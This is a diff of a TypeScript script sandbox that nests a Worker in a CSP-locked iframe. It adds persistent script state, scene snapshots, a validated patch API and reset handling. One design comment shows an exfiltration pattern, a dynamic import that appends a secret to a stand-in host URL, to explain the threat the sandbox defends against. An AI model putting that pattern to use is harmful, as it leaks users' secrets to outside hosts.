@@ -1,4 +1,12 @@
-import type { SandboxEntity, StepResponse } from "./scriptSandbox.worker";
+import { SCRIPT_STATE_NORMALIZER_SOURCE } from "./scriptSandboxState";
+import { SCRIPT_VECTOR_NORMALIZER_SOURCE } from "./scriptSandboxVector";
+import type {
+  GetWorldStateRequest,
+  GetWorldStateResponse,
+  SandboxEntity,
+  StepRequest,
+  StepResponse,
+} from "./scriptSandbox.worker";
 
 /**
  * Runs project scripts in a Worker hosted inside a CSP-locked, opaque-origin
@@ -8,7 +16,7 @@ import type { SandboxEntity, StepResponse } from "./scriptSandbox.worker";
  *
  * - A **Worker** gives thread isolation, so `while (true) {}` is contained and
  *   can be terminated. But a Worker cannot carry a Content-Security-Policy,
- *   and dynamic `import()` is syntax rather than a property — so no amount of
+ *   and dynamic `import()` is syntax rather than a property -- so no amount of
  *   global hardening stops `import("http://host/?" + secret)`.
  * - A **CSP iframe** can refuse `import()` (`script-src` permits no URL
  *   source) and every network call (`connect-src 'none'`). But a same-process
@@ -63,38 +71,209 @@ var reply = self.postMessage.bind(self);
   }
 })();
 
-const compiled = new Map();
+${SCRIPT_VECTOR_NORMALIZER_SOURCE}
+
+${SCRIPT_STATE_NORMALIZER_SOURCE}
+
+// Mirrors the standalone worker's persistent state boundary.
+var selfState = new Map();
+var worldState = {};
+
+var compiled = new Map();
 function compile(id, code) {
-  const cached = compiled.get(id);
+  var cached = compiled.get(id);
   if (cached && cached.code === code) return cached.fn;
-  const fn = new Function(
+  var fn = new Function(
     "entity", "state", "delta",
     '"use strict";\n' + code + '\nreturn typeof update === "function" ? update(entity, state, delta) : state;'
   );
   compiled.set(id, { code, fn });
   return fn;
 }
-self.onmessage = (event) => {
-  const request = event.data;
-  if (!request || request.type !== "step") return;
-  const logs = [];
-  const names = request.entities.map((e) => e.name);
-  for (const entity of request.entities) {
-    for (const scriptId of entity.scriptIds) {
-      const script = request.scripts.find((s) => s.id === scriptId);
+function buildScene(entities) {
+  var snapshots = entities.map(function (entity) {
+    return {
+      id: entity.id,
+      name: entity.name,
+      kind: entity.kind,
+      visible: entity.visible,
+      position: { x: entity.position.x, y: entity.position.y, z: entity.position.z },
+      rotation: { x: entity.rotation.x, y: entity.rotation.y, z: entity.rotation.z },
+      scale: { x: entity.scale.x, y: entity.scale.y, z: entity.scale.z },
+    };
+  });
+  for (var i = 0; i < snapshots.length; i++) deepFreeze(snapshots[i]);
+  var frozen = deepFreeze(snapshots);
+  var byName = new Map();
+  var byId = new Map();
+  for (var k = 0; k < snapshots.length; k++) {
+    byName.set(snapshots[k].name, snapshots[k]);
+    byId.set(snapshots[k].id, snapshots[k]);
+  }
+  function find(nameOrId) {
+    return byName.get(nameOrId) || byId.get(nameOrId) || null;
+  }
+  return { scene: frozen, find: find };
+}
+function buildPatch(entities, logs, scriptName, lastScriptName) {
+  var byName = new Map();
+  var byId = new Map();
+  for (var i = 0; i < entities.length; i++) {
+    byName.set(entities[i].name, entities[i]);
+    byId.set(entities[i].id, entities[i]);
+  }
+  return function patchEntity(nameOrId, input) {
+    if (typeof nameOrId !== "string" || nameOrId.length === 0) {
+      logs.push("script " + scriptName + ": state.patch target must be a non-empty entity name or id; ignored");
+      return false;
+    }
+    var target = byName.get(nameOrId) || byId.get(nameOrId);
+    if (!target) {
+      logs.push("script " + scriptName + ": state.patch could not find entity \"" + nameOrId + "\"; ignored");
+      return false;
+    }
+    if (!input || typeof input !== "object" || Array.isArray(input)) {
+      logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\") expects an object containing position, rotation, or scale; ignored");
+      return false;
+    }
+    var fields = ["position", "rotation", "scale"];
+    var components = ["x", "y", "z"];
+    var keys = Object.keys(input);
+    var unsupported = keys.filter(function (key) { return fields.indexOf(key) < 0; });
+    if (unsupported.length > 0) {
+      logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\") only supports position, rotation, and scale; ignored " + unsupported.join(", "));
+    }
+    var changed = false;
+    for (var fi = 0; fi < fields.length; fi++) {
+      var field = fields[fi];
+      if (!Object.prototype.hasOwnProperty.call(input, field)) continue;
+      var candidate = input[field];
+      if (!candidate || typeof candidate !== "object" || Array.isArray(candidate)) {
+        logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\")." + field + " must be an object with finite x, y, or z values; ignored");
+        continue;
+      }
+      var supplied = false;
+      for (var ci = 0; ci < components.length; ci++) {
+        var component = components[ci];
+        if (!Object.prototype.hasOwnProperty.call(candidate, component)) continue;
+        supplied = true;
+        var value = candidate[component];
+        if (typeof value !== "number" || !Number.isFinite(value)) {
+          logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\")." + field + "." + component + " must be finite; ignored");
+          continue;
+        }
+        target[field][component] = value;
+        changed = true;
+      }
+      if (!supplied) {
+        logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\")." + field + " must include x, y, or z; ignored");
+      }
+    }
+    if (changed) lastScriptName.set(target.id, scriptName);
+    var hasTransform = fields.some(function (field) { return field in input; });
+    if (!changed && unsupported.length === 0 && !hasTransform) {
+      logs.push("script " + scriptName + ": state.patch(\"" + nameOrId + "\") did not include position, rotation, or scale; ignored");
+    }
+    return changed;
+  };
+}
+self.onmessage = function (event) {
+  var request = event.data;
+  if (!request) return;
+  if (request.type === "getWorldState") {
+    reply({ type: "getWorldState", seq: request.seq, world: worldState });
+    return;
+  }
+  if (request.type === "reset") {
+    selfState.clear();
+    worldState = {};
+    compiled.clear();
+    reply({ type: "reset-ack" });
+    return;
+  }
+  if (request.type !== "step") return;
+  var logs = [];
+  var names = request.entities.map(function (e) { return e.name; });
+  // Capture the pre-step vectors so a script that writes an array or
+  // NaN-poisons a component is reverted to a known-finite value rather
+  // than corrupting the live scene.
+  var preStep = new Map();
+  var lastScriptName = new Map();
+  for (var pi = 0; pi < request.entities.length; pi++) {
+    preStep.set(request.entities[pi].id, snapshotEntity(request.entities[pi]));
+  }
+  var built = buildScene(request.entities);
+  var scene = built.scene;
+  var find = built.find;
+  for (var ei = 0; ei < request.entities.length; ei++) {
+    var entity = request.entities[ei];
+    for (var si = 0; si < entity.scriptIds.length; si++) {
+      var scriptId = entity.scriptIds[si];
+      var script = null;
+      for (var ss = 0; ss < request.scripts.length; ss++) {
+        if (request.scripts[ss].id === scriptId) { script = request.scripts[ss]; break; }
+      }
       if (!script) continue;
+      var perScript = selfState.get(script.id);
+      if (!perScript) { perScript = new Map(); selfState.set(script.id, perScript); }
+      var selfSlot = perScript.get(entity.id);
+      if (!selfSlot) { selfSlot = {}; perScript.set(entity.id, selfSlot); }
       try {
-        compile(script.id, script.code)(entity, { time: request.time, entities: names }, request.delta);
+        var patch = buildPatch(request.entities, logs, script.name, lastScriptName);
+        compile(script.id, script.code)(entity, {
+          time: request.time,
+          entities: names,
+          scene: scene,
+          find: find,
+          patch: patch,
+          self: selfSlot,
+          world: worldState,
+        }, request.delta);
+        lastScriptName.set(entity.id, script.name);
       } catch (error) {
         logs.push("script " + script.name + ": " + String(error));
       }
     }
   }
+  // Normalize persistent stores. Same contract as the standalone worker:
+  // JSON-safe, depth-bounded, drop-and-log rather than throw.
+  selfState.forEach(function (perScript, scriptId) {
+    perScript.forEach(function (slot, entityId) {
+      var r = sanitizeScriptState(slot, scriptId + "/" + entityId);
+      for (var li = 0; li < r.logs.length; li++) logs.push(r.logs[li]);
+      if (r.value && typeof r.value === "object" && !Array.isArray(r.value)) {
+        perScript.set(entityId, r.value);
+      } else {
+        perScript.set(entityId, {});
+      }
+    });
+  });
+  var worldResult = sanitizeScriptState(worldState, "world");
+  for (var wi = 0; wi < worldResult.logs.length; wi++) logs.push(worldResult.logs[wi]);
+  if (worldResult.value && typeof worldResult.value === "object" && !Array.isArray(worldResult.value)) {
+    worldState = worldResult.value;
+  } else {
+    worldState = {};
+  }
   reply({
     type: "step",
     seq: request.seq,
-    patches: request.entities.map((e) => ({ id: e.id, position: e.position, rotation: e.rotation, scale: e.scale })),
-    logs,
+    patches: request.entities.map(function (e) {
+      var original = preStep.get(e.id);
+      if (!original) {
+        return { id: e.id, position: e.position, rotation: e.rotation, scale: e.scale };
+      }
+      var attributed = lastScriptName.get(e.id) || "unknown";
+      var normalized = normalizeEntity(original, e, attributed);
+      for (var ni = 0; ni < normalized.logs.length; ni++) logs.push(normalized.logs[ni]);
+      return {
+        id: e.id,
+        position: normalized.entity.position,
+        rotation: normalized.entity.rotation,
+        scale: normalized.entity.scale,
+      };
+    }),
+    logs: logs,
   });
 };
 `;
@@ -124,7 +303,11 @@ window.addEventListener("message", function (event) {
     reply({ type: "restarted" }, "*");
     return;
   }
-  if (request.type === "step" && worker) worker.postMessage(request);
+  if (request.type === "reset") {
+    if (worker) worker.postMessage(request);
+    return;
+  }
+  if ((request.type === "step" || request.type === "getWorldState") && worker) worker.postMessage(request);
 });
 
 spawn();
@@ -153,12 +336,30 @@ export class FrameSandbox {
   private ready: Promise<void>;
   private seq = 0;
   private pending = new Map<number, { resolve: (value: FrameStepOutcome) => void; timer: number }>();
+  private worldPending = new Map<number, { resolve: (value: Record<string, unknown>) => void; timer: number }>();
+  private resetPending: Array<{ resolve: () => void; timer: number }> = [];
   private readonly onMessage: (event: MessageEvent) => void;
 
   constructor() {
     this.onMessage = (event: MessageEvent) => {
       if (!this.frame || event.source !== this.frame.contentWindow) return;
-      const data = event.data as StepResponse | { type: string };
+      const data = event.data as StepResponse | GetWorldStateResponse | { type: string };
+      if (data?.type === "reset-ack") {
+        const pending = this.resetPending.shift();
+        if (!pending) return;
+        window.clearTimeout(pending.timer);
+        pending.resolve();
+        return;
+      }
+      if (data?.type === "getWorldState") {
+        const response = data as GetWorldStateResponse;
+        const pending = this.worldPending.get(response.seq);
+        if (!pending) return;
+        this.worldPending.delete(response.seq);
+        window.clearTimeout(pending.timer);
+        pending.resolve(response.world);
+        return;
+      }
       if (data?.type !== "step") return;
       const response = data as StepResponse;
       const entry = this.pending.get(response.seq);
@@ -211,9 +412,44 @@ export class FrameSandbox {
     });
   }
 
+  async getWorldState(): Promise<Record<string, unknown>> {
+    await this.ready;
+    const seq = ++this.seq;
+    return new Promise<Record<string, unknown>>((resolve) => {
+      const timer = window.setTimeout(() => {
+        this.worldPending.delete(seq);
+        resolve({});
+      }, STEP_TIMEOUT_MS);
+      this.worldPending.set(seq, { resolve, timer });
+      this.frame?.contentWindow?.postMessage({ type: "getWorldState", seq } satisfies GetWorldStateRequest, "*");
+    });
+  }
+
+  reset(): Promise<void> {
+    return new Promise<void>((resolve) => {
+      const timer = window.setTimeout(() => {
+        const index = this.resetPending.findIndex((entry) => entry.resolve === resolve);
+        if (index >= 0) this.resetPending.splice(index, 1);
+        resolve();
+      }, STEP_TIMEOUT_MS);
+      this.resetPending.push({ resolve, timer });
+      this.frame?.contentWindow?.postMessage({ type: "reset" }, "*");
+    });
+  }
+
   dispose(): void {
     for (const entry of this.pending.values()) window.clearTimeout(entry.timer);
     this.pending.clear();
+    for (const entry of this.worldPending.values()) {
+      window.clearTimeout(entry.timer);
+      entry.resolve({});
+    }
+    this.worldPending.clear();
+    for (const pending of this.resetPending) {
+      window.clearTimeout(pending.timer);
+      pending.resolve();
+    }
+    this.resetPending = [];
     window.removeEventListener("message", this.onMessage);
     this.frame?.remove();
     this.frame = null;
@@ -224,10 +460,10 @@ export class FrameSandbox {
  * True when this environment can host the frame transport.
  *
  * `Worker` is part of the requirement, not incidental: the frame's whole
- * purpose is to host one. Environments without it — jsdom under vitest — also
- * do not execute scripts inside a srcdoc iframe, so the mount would simply
- * time out. Requiring it keeps the fallback selection correct rather than
- * special-casing the test runner.
+ * purpose is to host one. Environments without it -- jsdom under vitest --
+ * also do not execute scripts inside a srcdoc iframe, so the mount would
+ * simply time out. Requiring it keeps the fallback selection correct rather
+ * than special-casing the test runner.
  */
 export function canUseFrameSandbox(): boolean {
   return (
